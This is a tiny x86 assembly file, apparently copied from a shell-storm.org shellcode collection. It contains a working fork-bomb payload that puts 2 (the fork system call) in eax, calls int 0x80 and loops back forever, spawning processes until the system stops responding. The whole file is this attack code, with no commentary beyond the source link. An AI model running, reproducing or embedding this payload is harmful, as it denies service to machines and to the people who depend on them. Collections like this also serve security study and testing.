; http://shell-storm.org/shellcode/files/shellcode-214.php
global _start

section .text

_start:
    xor ebx, ebx
    inc ebx
    inc ebx

_syscall:
    mov eax, ebx
    int 0x80
    jmp _syscall
